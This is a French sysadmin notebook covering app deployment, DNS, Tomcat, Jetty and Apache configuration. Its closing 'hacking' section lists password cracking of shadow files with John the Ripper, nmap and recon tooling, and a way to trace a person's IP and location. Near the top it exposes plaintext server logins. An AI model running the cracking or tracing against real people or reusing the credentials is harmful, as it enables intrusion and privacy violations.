jakarta-taglibs-page.jar:/logiciels/APP_EGN/WEB-INF/lib/jakarta-taglibs-request.jar:/logiciels/APP_EGN/WEB-INF/lib/jakarta-taglibs-response.jar:/logiciels/APP_EGN/WEB-INF/lib/jakarta-taglibs-session.jar:/logiciels/APP_EGN/WEB-INF/lib/jaxp.jar:/logiciels/APP_EGN/WEB-INF/lib/jdbc2_0-stdext.jar:/logiciels/APP_EGN/WEB-INF/lib/jndi.jar:/logiciels/APP_EGN/WEB-INF/lib/ldap.jar:/logiciels/APP_EGN/WEB-INF/lib/log4j.jar:/logiciels/APP_EGN/WEB-INF/lib/providerutil.jar:/logiciels/APP_EGN/WEB-INF/classes:/logiciels/APP_EGN/WEB-INF/lib/mail.jar]

c'est peut etre parce que dans le repertoire classes il manque des classes necessaire lors du lancement de l'appli:(on startup)


Livraison groupnet MCO : 

Faire livraison sous wincvs.

Si besoin, recuperer tout le code source de wincvs en fesait un checkout modules sous une nouveau repertoire livraison avec l'option "do not create CVS directories"

Zipper le repetoire groupnet : Groupnet.zip
A l'aide de winzip, enlever tous les fichiers que je n'ai pas modifie pour l'evolution

sudo su -
(ou telnet clgrpns1 593 user : mntegn pass egn_12345 puis sudo su -)
sauver l'ancien repetroire Groupnet : mv Groupnet Groupnet.old

ftp clgrpns1 591

faire un put du Groupnet.zip
dezipper Groupnet.zip pour remplacer l'ancienne arborescence sous /home00/mntegn/compile/DEPOT_CVS/APP_EGN/EGN_WAS/GroupNet
unzip GroupNet .zip


Pour liver à  EXM :

Executer le script home00/mntegn/Livraison/deliver.sh
Le modifier au prealable si besoin. : pour l'instant il tar que la partie groupnet. Voir le fichier 
deliver ;SH.ori si besoin tarrer aussi jive et calendra.
Attention, j'ai modifie deliver.sh actuel pour que il ne copie plus les groupnet/fichiers et groupnet/web-inf/*.xmlà je n'ai pas fait cette modif dans deliver.sh.old*
Attention, si je le modifie, peour pouvoir l'executer apres, lui redonner les droits : 
Chmod -R 755 deliver.sh
Et ensuite sudo su - puis ./deliver.sh
Attention : peut etre il n'y a pas assez de place pour les copies que va executer deliver.sh :
Verifier avec Commande unix: 
Df -k pour voir si il y a de la place. 1 Mo devrait suffire (1 xxx xxx)


Quand le tar est genere (sous /oracle1/Livraison_EGN), faire tar tvf Groupnet_xx.xx.xx.tar pour voir ce qu'il contient

Ensuite, le mettre sur clwgc2a sous \clwgc2a\home00\mntwgc\Livraisons\EGN (utiliser Hummingbird)
mntwgc
wgc___

Prevenir  webmaster-exm@edfgdf.fr  pour la livraison
                                                                                                                                 _google.com
----------------------------                                                                                                    /
LES ZONES : ZONE :DNS :                                                                                                             com  kanail.fr
      Definitions: DNS : nom d'hôte hostname <-correspond-> IP. utilise le port 53(UDP=requete très rapide sans auth.) root/    /            C'est une infra à part entiere : il a ses serveurs, son protocole il peut etre floode(crouler sous le taf)
       (*x)<-> machine                                                                                       \_fr
      hostname  = nom du serveur = nom d'hôte = domaine = site web. Possible etre une machine ou pas.                            \_toto.fr
      1 machine peut avoir plusieurs domaines 
      Je suis dans la zone de mon domaine blalbabli.com
      www           CNAME (see name)        pitous.tataboabndou.net. (ne peut pas etre une adresse ip et TOUJOURS mettre un "." a la fin)   TTL 3h = cache de 3h au sein de la machine de l'utilisateur lambda. Debrancher-rebrancher la box pour effacer le cache        // [1] si url = www.blalbabli.com alors aller vers pitous.tataboabndou.net et ainsi de suite jusqu'à arriver à un "A"
      ...
      ...
      
      et dans la zone de mon domaine tataboabndou.net il  ya :
      www            A                    1230.515.516   // [3] obligatoirement une adresse ipv4 pour A. Point d'arrivee final vers un serveur de destination.
       ?             AAAA                  ?             // adresse ipv6
       ?             PTR                   ?             // inverse de A ou AAA : permet recuperer hostname depuis adresse ip
       ?             MX                                   //nom du serveur mail
      pitous        CNAME                 www.tataboabndou.net.  // [2] // ne pas oublier le point à la fin
      
      Il faut definir une redirection web pour si qqun saisi blalbabli.com (sans www) car sinon la redirection se fait bien mais google voit 2 sites : blalbabli.com et www.blalbabli.com qui dirige vers le meme serveur et le rank est divise par deux.
      redirection web : 
      sous domaine   type                 adresse de destination
      (vide)         directe(permanante)  http://www.blalbalbi.com         // si URL = blalbabli.com alers vers www.blalbabli.com et le rank google est bon.
  En cas de modification les serveurs DNS propage l'information: ce delai de propagation peut durer 24h
tomcat :
    erreur java.lang.IllegalStateException: No output folder
          demarrer tomcat avec un user ayant les droits d'ecritures
    problème d'encodage utf8?
          dans catalina.sh : 
                la ou ya JAVA_OPTS="$JAVA_OPTS $JSSE_OPTS"
                j'ai mis à la place  JAVA_OPTS="$JAVA_OPTS $JSSE_OPTS -Dfile.encoding=UTF-8 " si on ne met pas il va prendre celui def dans le java installé variable d'environnement sur le poste
          Set URIEncoding="UTF-8" on your <Connector> in server.xml. References: HTTP Connector, AJP Connector. (AJP sert à faire communiquer APACHE----ajp--->Tomcat au lieu de APACHE----http--->tomcat qui est moins efficace(et pas protégé car port http ouvert))
          Use a character encoding filter with the default encoding set to UTF-8 
          Change all your JSPs to include charset name in their contentType. 
          For example, use <%@page contentType="text/html; charset=UTF-8" %> for the usual JSP pages and <jsp:directive.page contentType="text/html; charset=UTF-8" /> for the pages in XML syntax (aka JSP Documents). 
          Change all your servlets to set the content type for responses and to include charset name in the content type to be UTF-8. 
          Use response.setContentType("text/html; charset=UTF-8") or response.setCharacterEncoding("UTF-8"). 
          Change any content-generation libraries you use (Velocity, Freemarker, etc.) to use UTF-8 and to specify UTF-8 in the content type of the responses that they generate. 
          Disable any valves or filters that may read request parameters before your character encoding filter or jsp page has a chance to set the encoding to UTF-8. For more information see http://www.mail-archive.com/users@tomcat.apache.org/msg21117.html.
   server.xml ne peut pas faire du http sur port 80 mais que sur 8080
      alors faire 
          sudo /sbin/iptables -t nat -I PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
    pour matcher le dns avec mon war : (dans server.xml) 
        <!-- <Context docBase="/opt/server/apache-tomcat-7.0.72/resources/imgtransporteur" path="/transport/imgtransporteur" /> -->
              <Context docBase="/opt/server/apache-tomcat-7.0.72/resources/imgtransporteur" path="/imgtransporteur" /> // pour definir le repertoire des images
              <Context docBase="/opt/server/apache-tomcat-7.0.72/webapps/transport" path="" /> // la racine du dns doit pointer vers mon appli
    data-context.xml LINK929293 definition d'un jndi
                     <bean id="dataSource" class="org.springframework.jndi.JndiObjectFactoryBean">                     
                            <property name="jndiName" value="java:/comp/env/jdbc/tatata" />                             
                        </bean>     
                  et dans catalina/localhost/monapplication.xml se trouve la definition du jndi:
                      <Resource name="jdbc/tatata" auth="Container"
                        factory="org.apache.commons.dbcp.BasicDataSourceFactory"
                        type="javax.sql.DataSource" username="JETSPEED" password="JETSPEED"
                        driverClassName="oracle.jdbc.driver.OracleDriver ou com.microsoft.sqlserver.jdbc.SQLServerDriver" url="jdbc:oracle:thin:@localhost:1521:HRBAC92"
                        maxActive="100" maxIdle="30" maxWait="10000" validationQuery="SELECT CLIENT_ID FROM CLIENT"/>                                                                                      
                                 
jetty :
  pour envoyer header et forcer la suppression du cache par le browser : 
          dans webdefault.xml remplacer 
          <!--
            <init-param>
                  <param-name>cacheControl</param-name>
                  <param-value>max-age=3600,public</param-value>
            </init-param>
            -->
            par
            <init-param>
              <param-name>cacheControl</param-name>
              <param-value>no-store,no-cache,must-revalidate</param-value>
            </init-param>
  cd /opt/jetty
  (les webapps sont sous /opt/jetty/webapps)
  demarrer :
        invoke-rc.d jetty start ou stop (sous etc/init.d)
        /usr/local/java/bin/java -jar start.jar > server.log (si on veut logger)
        /usr/local/java/bin/java -jar /opt/jetty/start.jar --stop (pour stopper)
        /usr/local/java/bin/java -Djetty.home=/opt/jetty -Djava.io.tmpdir=/tmp -jar /opt/jetty/start.jar --pre=etc/jetty-logging.xml etc/jettyWenh.xml --daemon
        http://95.142.162.203:8080/SamiCours-1.0/SamiCours.html
        si il ne trouve pas une servlet dans web.xml inverser l'ordre des balises servlet-mapping et servlet
   redemarrer :
       /etc/init.d/jetty restart
       si erreur jndi faire echo $PATH et y rajouter le chemin vers java c a d :
       export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/java/bin
  securite:
      modifier fichier webdefault.xml voir jetty-testrealm.xml et realm.properties puis  
      <Set name="defaultsDescriptor"><SystemProperty name="jetty.home" default="."/>/etc/webdefault.xml</Set>      
  sous  unix:
      definir un contexte pour les images: (le fichier sous contexts doit sappeler XXXXXXXResources.xml) 
              <?xml version="1.0"  encoding="ISO-8859-1"?>
              <!DOCTYPE Configure PUBLIC "-//Mort Bay Consulting//DTD Configure//EN" "http://jetty.eclipse.org/configure.dtd">
            <Configure class="org.eclipse.jetty.server.handler.ContextHandler">
                  <Call class="org.eclipse.jetty.util.log.Log" name="debug"><Arg>SamiCoursImages</Arg></Call>
                  <Set name="contextPath">/WenhuaDuvergeImages</Set>
                  <Set name="resourceBase"><SystemProperty name="jetty.home" default="."/>/SamiCoursImages/</Set>
                  <Set name="handler">
                      <New class="org.eclipse.jetty.server.handler.ResourceHandler">
                          <Set name="welcomeFiles">
                              <Array type="String">
                                  <Item>index.html</Item>
                              </Array>
                          </Set>
                          <Set name="cacheControl">max-age=3600,public</Set>
                      </New>
                  </Set>
              </Configure>

        puis mettre un repertoire contexts../SamiCoursImages/mesimages.jpg accessibles ensuite via http://...../WenhuaDuvergeImages/blabla.jpg              
              
              
    definir le contexte pour les images avec maven: 
    <!-- jetty -->
      	<plugin>
		  <groupId>org.eclipse.jetty</groupId>
		  <artifactId>jetty-maven-plugin</artifactId>
		  <version>9.2.1.v20140609</version>
		  <configuration>

        	<webAppSourceDirectory>${project.basedir}/target/${project.artifactId}-${project.version}</webAppSourceDirectory>
		  <port>8081</port>
              <contextHandlers>
                  <contextHandler implementation="org.eclipse.jetty.maven.plugin.JettyWebAppContext">
                      <war>${project.basedir}/target/${project.artifactId}-${project.version}.war</war>
                      <contextPath>/Sami</contextPath>
                  </contextHandler>
             <!-- si dessous contexte pour images ailleurs -->
                  <contextHandler implementation="org.eclipse.jetty.maven.plugin.JettyWebAppContext">
                      <contextPath>/SamiCoursImages</contextPath>
                      <resourceBase>../SamiCoursImages/</resourceBase>
                  </contextHandler>
              </contextHandlers>
        <!-- declarer que log4j doit etre sous web-inf/classes : --> 
        <systemProperties>
                  <systemProperty>
                      <name>log4j.configuration</name>
                      <value>log4j.properties</value>
                  </systemProperty>
              </systemProperties>
          </configuration>
		</plugin>
  
     
APACHE :
Connaitre la version d'apache
  apachectl -V
logs apache sur /var/log/apache2
apache pour conf sous /etc/apache2/
pour trouver ou est apache:
   find / -name httpd.conf > todelete.log
    locate httpd.conf
pour installer mod_rewrite:
    sudo a2enmod rewrite pour faire ça:LINKrewri99
    a2enmod headers // pour installer le module mod_headers
si php n'est plus interpreté: 
    reactiver le module php: a2enmod php7.2(voir les modules dispo sous etc/apache2/mods-available) 
redirection: expression regulières 
      RedirectMatch ^/shop(.*)$ https://www.wenhuaduverge.com$1 redirige tout ce qui se termine par /shopquelquechose vers wenhuaduverge.comquelquechose
rediriger tout http vers https (j'ai essaye avec .htaccess mais n'a pas marche)
      meth1: 
        <VirtualHost...>
            RewriteEngine on
            RewriteCond %{SERVER_PORT} !^443$
            RewriteRule ^/(.*) https://%{SERVER_NAME}/$1 [L,R]
      Meth2: ajouter
        <VirtualHost *:80>
          ServerName www.kanail.net
          Redirect permanent / https://www.kanail.net/
        </VirtualHost>
        <VirtualHost *:443>
          ServerName....etcetc...          
pour redemarrer apache sur ubuntu :
  Attention, si j'ai fait des modifs, avant de redemarrer faire : 
      apachectl configtest verifier ou bien reload
      ou
      /etc/init.d/apache2 configtest
      
      /etc/init.d/apache2 status // pour voir si le serveur est demarre ou pas 
      /etc/init.d/apache2 stop          faire un tail sur les logs quand on fait ces choses.
      /etc/init.d/apache2 start
      apachectl start
      ou bien /etc/init.d/apache2 restart (cela rafraichit le php.ini)
      service apache2 reload // recharge la conf sans faire d'arret relance   // poossible mettre aussi start stop restart reload...
      service apache2 restart // arrete et redemarre (je crois) // poossible mettre aussi start stop restart reload...
      ou bien invoke-rc.d apache2 start(/etc/init.d) ou stop ou reload

htaccess :  
Autoriser le cross-domain: si par exemple le canvas fait une erreur tainted canvas etc...
    dans .htaccess
    <IfModule mod_headers.c>
       Header set Access-Control-Allow-Origin * // on peut utiliser les wild card  wildcard ici comme par ex *.memoclap.com
        Header set Access-Control-Allow-Credentials true
    </IfModule>
    il est prioritaire sur ce qu'on peut mettre dans une page php comme par exemple 
      header('Access-Control-Allow-Origin: *');// a mettre si apres avoir mais dans htaccess ca ne marche toujours pas */
pour enlever les extentions .php .html: 
      RewriteEngine On                 LINKrewri99
      RewriteCond %{REQUEST_FILENAME} !-f
      RewriteRule ^([^\.]+)$ $1.php [NC,L]  //enleve .php
      RewriteRule ^([^\.]+)$ $1.html [NC,L] //enleve .html
pour autoriser/interdir à notre apache d'afficher les dossiers
  Options All Indexes // (avec s ou sans?) autorise apache à afficher les contenu de tous les dossiers. Du coup avec google si je cherche "Index Of" je peux naviger avec mon navigateur. :-O
  Options All -Indexes // (avec s ou sans?)interdit affichage des dossiers mais n'empeche pas d'acceder à l'url complette d'un fichier dans ce repertoire.      
pour faire des redirections 301 si une page https://monsite/a.php n'existe plus et est remplacee par https://monsite/b.php pour ne pas perdre le seo LINK*.33..3
il faut donc que je connaisse mes anciennes pages qui n'existent plus. Si je ne sais plus aller dans googlewebmastertools>index
      Options +FollowSymLinks  // si j'ai erreur "Either all Options must start with + or -, or no Option may." bien mettre des + ou - avant chaque option
      RewriteEngine On                LINKrewri99
      RewriteRule ^ancienne-page1.html$ nouvelle-page1.html [R=301,L]
      RewriteRule ^ancienne-page2.html$ nouvelle-page2.html [R=301,L]
      

robots.txt : defini des repertoires ou fichiers qu'on souhaite masquer des moteurs de recherche. (empeche pas d'acceder au fichier via url) .permet aussi de supprimer de l'historiques des moteurs de recherche. MAIS robot.txt est public donc attention à ce qu'on ecrit dedans. Plus d'infos sur http://robots.txt.com 
User-agent * // pour tous les moteurs de recherche ou User-agent ia_archiver //interdit l'achrchivage par archive.org et autres.
Dissalow / (tout!)
Dissalow /unrepertoire/
Dissalow /unrepertoire/unfichier.php
Allow /unrepertoire/unautrerepertoireLeSeulAEtreVisible/
Dissalow etc...


sur unix pour activer un serveur virtuel:
pour activer un serveur virtuel a2ensite www.memoclap.com maintenant les fichiers sites doivent se terminer par .conf
a l'inverse pour le desactiver : a2dissite www.memoclap.com
<VirtualHost *:80> // pour toute requette vers le port 80
  ServerName tousalecole.com ou www.memoclap.com
  ServerAlias *.memoclap.com
  DocumentRoot "C:/wamp/www/sf_sandbox/web"
  DirectoryIndex index.php
  Alias /acceuil C:/wamp/www/sf_sandbox/web/sf
  SSLEngine on // si erreur a cause de ça activer le mod ssl avec:sudo a2enmod ssl
  SSLCertificateFile /etc/letsencrypt/live/memoclap.com/cert.pem
  SSLCertificateKeyFile /etc/letsencrypt/live/memoclap.com/privkey.pem
  SSLCertificateChainFile /etc/letsencrypt/live/memoclap.com/chain.pem
  ErrorLog  "|cronolog --symlink=${APACHE_LOG_DIR}/www.memoclap.com/error.log   ${APACHE_LOG_DIR}/www.memoclap.com/%Y/%m/error.log"
  CustomLog "|cronolog --symlink=${APACHE_LOG_DIR}/www.memoclap.com/access.log   ${APACHE_LOG_DIR}/www.memoclap.com/%Y/%m/access.log" combined
  ErrorDocument 404 https://www.memoclap.com/notfound.html
  <Directory "C:/wamp/www/sf_sandbox/web/sf">  // pour dire qui a le droit d'acceder dans ce repertoire
    AllowOverride All    // sous ce repertoire, tous les .htaccess ovverrident ceux du niveau au dessus. Si je mets None alors les .htaccess (ne pas en faire trop: pb de perf) du dessous ne override pas cette regle // possible mettre All None Options...
                         +followsymlink  veut dire suit les ln (liens)
    Allow from All // allow from none : le lit aucun .htaccess en dessous; allow from all: lis les tous
  </Directory>
  <Directory "C:\wamp\www\sf_sandbox\web">
    Options -Indexes // (ligne facultative. Indexes veut dire que si j'ai pas index.html sous ce repertoire alors il affiche la liste du contenu du repertoire dans le browser) autre options: Includes = ? FollowSymLinks = liens symboliques actives etc.. bof
    AllowOverride All
    Order allow,deny   // d'abord traite Allow puis Deny qui cloture le tout. Ici donc tout le monde est refuse sauf ceux de la liste allow (mais ci dessous tout le monde est accepte: on aurait pu faire une liste pour autoriser que certaines adresses IP ou DNS a acceder au site)
    Allow from All
  </Directory>
</VirtualHost>



sur apache, pour empecher l'acces a certains types de fichiers en navigation:
RewriteRUle .*\groupnet/fichier/(.*).(pdf|htm)$ https://130.98.249.78/groupnet/jsp/login.jsp
RewriteRule  .*\edf_group/(.*)\.htm$ https://130.98.29.78/groupnet/jsp/login.jsp

Pour rediriger les requetes du port 8080 de apache vers jetty : 
        côte apache:
            1:Load the proxy module (and any other proxy extension used): activer le proxy_http du module mod_proxy:
                      a2enmod proxy             
                      a2enmod proxy_http (ici http)
                      service apache2 restart
                1,5:verifier que c'est installe:
                 sous apache2/modules/ il doit y avoir : proxy.load -> ../mods-available/proxy.load et dans ce fichier proxy.load il doit y avoir LoadModule proxy_module /usr/lib/apache2/modules/mod_proxy.so 
            2:Turn off forward proxy : dans modules/proxy.conf mettre : 
              ProxyRequests Off (desactiver fonctionnalite de direct proxy (par opposition au reverse proxy))
               <Proxy *>
               Order deny,allow   // dabord regarde deny puis applique allow a tout ca.
               Allow from all
               </Proxy>
            3 Configure reverse proxy paths with the URL of the Jetty server: dans le ficher /sites-enabled/www.mondomainepourjetty.com mettre:
                <VirtualHost *>
                          	ServerName www.mondomainepourjetty.com
                          	ServerAdmin webmaster@localhost
        #ServerAlias *.wenhuaduverge.com
        # Toutes les requêtes sont redirigees vers le serveur jetty sauf le repertoire shop qui doit être servi normalement (php)
                            ProxyPass /shop/ ! (execution de haut en bas voir ligne en dessous) (ProxyPass est une commande de reverseproxy) // laisse /shop tel qu'il est.                          	
                          	ProxyPass / http://localNOMDUSERVEURhost:8080/    // c'est ca qui va rediriger toutes les requetes du domaine www.mondomainepourjetty.com vers le port 8080 de jetty (voir ligne du dessus sauf celles qui finissent par shop/) // peut etre utilisé pour supprimer des termes de l'URL
                          	ProxyPassReverse ... // ca je pense que c'est pour quand mon serveur s'envoie une requête à lui-même.(redirection par ex) ATTENTION à l'ordre LINKpppassorder: mettre les plus specifique en haut.
                          	ProxyPreserveHost On
                          	DocumentRoot /var/www/suivi.booster-france.com/           //bof pas sur d'avoir besoin de ca
          pour rediriger les requetes de façon conditionnelle : 
                  RewriteCond "%{REMOTE_HOST}"  "^host1"  [OR] //si l'URL = ???ACOMPRENDRE expressionRegulière ou
                  RewriteCond %{HTTP_HOST} production-sodec.fr.auchan.com [OR] //si l'URL = ???ACOMPRENDRE expressionRegulière ou
                  RewriteCond "%{REMOTE_HOST}"  "^host3"       //si l'URL = ???ACOMPRENDRE expressionRegulière alors
                  RewriteRule ^/hra-space$ hra-space/cas [R] //rediriger expresssionReguliere vers destination
        DocumentRoot /var/www/www.wenhuaduverge.com/
      <Directory "/var/www/www.wenhuaduverge.com/shop">
        Options -Indexes FollowSymLinks
        AllowOverride All
        Order allow,deny
        Allow from all
      </Directory>
                                  ErrorLog  "|cronolog --symlink=${APACHE_LOG_DIR}/suivi.booster-france.com/error.log   ${APACHE_LOG_DIR}/suivi.booster-france.com/%Y/%m/error.log"
                                  CustomLog "|cronolog --symlink=${APACHE_LOG_DIR}/suivi.booster-france.com/access.log   ${APACHE_LOG_DIR}/suivi.booster-france.com/%Y/%m/access.log" combined
                          	# Possible values include: debug, info, notice, warn, error, crit,
                          	# alert, emerg.
                          	LogLevel warn
                          </VirtualHost>
User apache
Group apache // user et group veulent dire que le serveur est executer par le user apache qui n'a pas trop de privilege pour eviter qu'un script de mon site web efface tout par exemple car apache n'a pas trop de privileges



load balancing : loadbalancing : clustering :
    loadbalancing: une requette de l'utilisateur arrive LB redirige vers le serveur qui contient la session de cet utilisateur. si c'est page sans session(statique) redirige selon le LBpolicy selon les charges. Les serveurs ne se voient pas entre eux. Simple à mettre en place.
    clustering: inclu LB. mais en plus les serveurs se voient à travers un port et echangent entre eux pour partager la charge de boulot. +Complexe à installer.
              voir article http://docs.motechproject.org/en/latest/deployment/sticky_session_apache.html
              <Proxy balancer://HRaCluster>
                 BalancerMember ajp://localhost:52665 loadfactor=1 route=route6 timeout=300 retry=1
                 BalancerMember ajp://localhost:52685 loadfactor=1 route=route8 timeout=300 retry=1
                 BalancerMember ajp://localhost:52695 loadfactor=1 route=route9 timeout=300 retry=1

                 ProxySet stickysession=ROUTEID
                  ou bien        
                 ProxyPass / balancer://hra/ stickysession=JSESSIONID|jessionid scolonpathdelim=On voir LINKpppassorder

                 # timeout à 300 sinon on avait trop rapidement le message d'indisponibilite
                 # retry à 1 pour que apache reessaye une seconde apres avoir detecte un timeout
                 # car  pendant la duree du retry on a le message 'All workers are in error state for route' et on a un HTTP 501 .
              </Proxy>
              
              # stickysession means a user will stay on the same Tomcat
              # nofailover=Off means Tomcat should failover and Apache redirects
              ProxyPass        /hra-space balancer://HRaCluster/hra-space stickysession=ROUTEID nofailover=On voir LINKpppassorder
              ProxyPassReverse /hra-space balancer://HRaCluster/hra-space
              ProxyPass        /hr-dms balancer://HRaCluster:52683/hr-dms stickysession=ROUTEID nofailover=On
              ProxyPassReverse /hr-dms balancer://HRaCluster/hr-dms
              ProxyPass        /hr-rich-client balancer://HRaCluster:52683/hr-rich-client stickysession=ROUTEID nofailover=On
              ProxyPassReverse /hr-rich-client balancer://HRaCluster/hr-rich-client
              ProxyPass        /hr-portlets balancer://HRaCluster:52683/hr-portlets stickysession=ROUTEID nofailover=On
              ProxyPassReverse /hr-portlets balancer://HRaCluster/hr-portlets
              ProxyPass        /hr-self-service balancer://HRaCluster:52683/hr-self-service stickysession=ROUTEID nofailover=On
              ProxyPassReverse /hr-self-service balancer://HRaCluster/hr-self-service
              ProxyPass        /hr-configuration-tool-web-smartgwt balancer://HRaCluster:52683/hr-configuration-tool-web-smartgwt stickysession=ROUTEID nofailover=On
              ProxyPassReverse /hr-configuration-tool-web-smartgwt balancer://HRaCluster/hr-configuration-tool-web-smartgwt
              ProxyPass        /hr-audit-console balancer://HRaCluster:52683/hr-audit-console stickysession=ROUTEID nofailover=On
              ProxyPassReverse /hr-audit-console balancer://HRaCluster/hr-audit-console
              ProxyPass        /hr-admin-console balancer://HRaCluster:52683/hr-admin-console stickysession=ROUTEID nofailover=On
              ProxyPassReverse /hr-admin-console balancer://HRaCluster/hr-admin-console
              ProxyPass        /hr-online-query balancer://HRaCluster:52683/hr-online-query stickysession=ROUTEID nofailover=On
              ProxyPassReverse /hr-online-query balancer://HRaCluster/hr-online-query
              
              ProxyTimeout 300



pour faire des liens url plus petits shortened links : 
       https://bitly.com/

facebook :
    facebook  bouton share partage
    opengraph
      si pas de thumbnail : https://developers.facebook.com/tools/debug/sharing/ > debugger > recollecter (scrape again) > debugger
    faire un appel vers https://www.facebook.com/sharer.php?u=https://unepagedunsitewebcontenant dansSonHeader:
    il faut que dans le header il y ait : 
    <meta property="og:title" content="letitre">
    <meta property="og:url" content="l'url">
    <meta property="og:description" content="ladescription">
    <meta property="og:image" content="urlversl'image.jpg">
    <meta property="og:image:width" content="389"/> // facultatifs mais permet parrait-il que la mise a jour se fasse plus vite (pas reussi)
    <meta property="og:image:height" content="389"/>// facultatifs mais permet parrait-il que la mise a jour se fasse plus vite (pas reussi)
    <meta property="og:type" content="website" />
    penser à vider le cache de facebook sur https://developers.facebook.com/tools/debug/
  
hacking : haking : hack :
  trouver origine image recherche inverse image reverse thineye: tineye.com
  trouver l'adresse ip et l'adresse geographique de quelqu'un: whatstheirip.com puis iplocation.net
  craquer kraquer kraker mot de passe : john the ripper 
      /usr/share/john/john.conf contient les methodes pour craquer les mdp
      kraquer un fichier sythese passwd et shadow:
        john nomfichiersyntheseunshadow
        ou
        john nomfichiersyntheseUnshadow --users=nomusersquejeveuxcraquer
        les passwords trouves sont stoques dans john.pot
        appuyer sur n'importe quelle touche pendant analyse pour voir ou il en est en bruteforce force brute
  moteurs de recherches: 
          https://www.shodan.io
          ThinEye.com: en entree on donne image il trouve le site.
          facebook : 
                trouver une personne par son id:
                 http://www.facebook.com/profile.php?id=100004936843501
              passer en anglais et tapper "people who like xxx"
              saisir une adresse email dans le moteur de recherche il trouve la personne.
  voir info des images (s'appellent EXIF) http(s)://exif.regex.info
  google recherche avancee https://www.google.fr/advanced_search (possible tapper direct les commandes sur google)
    expressions pour trouver failles :https://www.exploit-db.com/google-hacking-database
    Hacker DNS :  
        flood
        Empoisonnement de cache//obliger le serveur DNS à enregistrer une fausse info dans son cache->fishing:on va sur www.google.com mais c pas google derrière
        Recuperation de l'adresse IP du hostname.
              nslookup :pour verifier que le DNS est bien config : on peut faire aussi à l'inverse nslookup ipadresse/nomdedomaine: renvoit nomdedomaine/adresseip corresp (reponse des serveurs de dns) 
                        >nslookup wec.intra.renault.fr
                          Serveur :  dc-boismortier.corp.noxiane.net // ca c le serveur DNS qui va chercher l'IP de wec.intra.renault.fr
                          Address:  138.21.151.138 // ca c l'adresse IP du serveur DNS ci dessus
                          Reponse ne faisant pas autorite : // ca ca veut dire que c un serveur DNS esclave ou du cache et qu'il ne trouve pas l'adresse IP qu'on recherche par un autre DNS maître directement.
                         Nom :    wec.intra.renault.fr
                         Address: xxx.xxx.xxx // cette fois ci c'est l'IP associe à wec.intra.renault.fr
                      autre recherche nslookup avec options de recherche : 
                      >nslookup + entree puis set type=mx (par exemple pour les serveurs de mail.)
                          toto.fr mail exchanger=xx titi.com.
                          toto.fr mail exchanger=xx tete.com. (donc deux serveur mails.)
              dig : // comme nslookup
              >dig toto.fr ou dig toto.fr TYPE (ou type = mx, ou A ou AAAA etc.)
              existe en ligne : https://toolbox.googleapps.com/apps/dig
                NS = donne moi les noms des serveurs DNS
        whois :recupere info proprietaire site.
            http://whois.domaintools.com
        ping : (attention ne marche pas forcement meme si serveur accessible par telnet ADRESSIP PORT car le serveur n'est pas apte à repondre aux pings car le flux ICMP n'est pas ouvert) attention interdit ne jamais scanner IP commencant par 129.xxx ou 128.xxx qui sont à l'arme americaine
          ping adresse_ip teste la connectivite à une IP.
          ping domaine_web
            reponse: PING domaine_web (ip_corresp)
                     xx bytes from hostname(nom de la machine)(adresse_ip_de_la_machine)
        mieux que telnet: nc: // pour tester la connexion en passant par un proxy
            nc -v -w 5 -X5 -xfrsopslinfv01:1080 93.20.168.11 636 // v pour verbose w pour timeout au bout de 5 secondes X pour version sock5 x pour le hostname:port du proxy puis hostnnamequonveutatteindre port
            nc -v -w 5 -X5 -xfrsopslinfv01:1080 rapplisaasaccess.groupeadeo.com 636
            nc -v -w 5 -X 5 -x frsopslinfv01:1080 ldap-master.22.sirca.info 636
            si j'ai l'erreur invalid tcp sequence number (flag=S.....) essayer avec une autre version du socks
          telnet :se fait sur un port: 
              exemple telnet 19.20.02.30 386 (port ldap par defaut) ftp sur port 591 par defaut
                  telnet clxs0aa 593  (login mntesp / password mntesp)                     
        pour savoir par ou passe une connexion reseau :
          traceroute : voir les chemins empruntes
                tracert ou traceroute url_ou_plutot_domaine_web (utile pour trouver le firewall ufw entre le service que je veux et moi) 
                exemple tracert hrm-dev 
        geolocaliser adresse ip: 
          https://iplocation.net (donne des estimations)
        historique : archive du web:
            archive.org
        IDS = système de detection d'intrusion
            
  pour proteger e-mail : https://protonmail.com
  SPF // Sending policy Framework (pour proteger les mails) Verifie l'identite de ceux qui envoient des mails
  DKIM // domain key Identify mail : pour signer les e-mails
  Sur kali : (root/root ou root/toor)
      nMap :   (complements sur windows: superscan) // pour savoir quels ports sont disponibles et avoir plus d'infos
        nmap -sP regexpD'adresse_ip : faire un ping. exemple 11.22.33/24 (de 11.22.0 à 11.22.255); 11.22.10-30 (de 11.22.10 à 30)
        nmap -sS adresse_ip //pour trouver les ports ouverts seulement dans une adresse ip (port peut etre ouvert,ferme,filtre(existe firewall),non-filtre=nmapchaispas)
        nmap -sV adresse_ip //pour trouver les ports et + de details. Très long à l'execution 
        nmap -p port1,port2 adressse_ip // avoir plus de details sur des ports même si ils sont fermes
        nmap -sC adresse_ip // ouaou: j'ai accès à plein de scripts options...A utiliser sur mes serveurs pour tester leur securite
        autres options : -v // plus de details
                        -A // agressive (très reperable)
                        -6 // ipv6
                       
      Maltego: outil pour analyser toutes ces donnees : > Applications > Maltego: INTERDIT de l'utiliser ailleurs que chez moi pour moi sauf si l'autre entreprise m'autorise à le faire.
            tracking code: les codes google analytics, addwords...
            server build with (det les technos U)
      Recon_ng : Applications -> Recuperation d'informations -> recon-ng // pour automatiser certaines taches de reconnaissance
            >show modules
                affiche une liste de modules puis use un_des_modules_affiche puis "show options" pour afficher les options du modules puis les definir exemple: "set SOURCE <ADDR_IP> puis "run". Manuel: "show info". Si besoin voir cle: "show keys". Si besoin definir cle: "key add facebook_api<CLE_API>". revenir au menu precedent "back"
      nikto -h adresse_ipOu_url // pour voir les vulnerabilites d'un site web
            OSVDB-xxx est un identifiant(nonmaintenuA8) pour trouver plus d'info sur internet
     owasp zap : outil pour trouver les failles d'un site web:sur kalilinux LINKfkjOwasplkjsg
          sur maven faire : 
                <plugin>
				<groupId>org.owasp</groupId>
				<artifactId>dependency-check-maven</artifactId>
				<version>3.2.1</version>
				<executions>
					<execution>
						<goals>
							<goal>check</goal>
						</goals>
					</execution>
				</executions>
			</plugin> puis mvn check ou verify: créé un fichier dependency-check-report.html dans target  
        x-frame-options header not set // en-tête de response permettant d'eviter qu'un site s'affiche dans un autre site (iframe i-frame object).(clickjacking : quand je clique ça clique sur un autre bouton invisible)
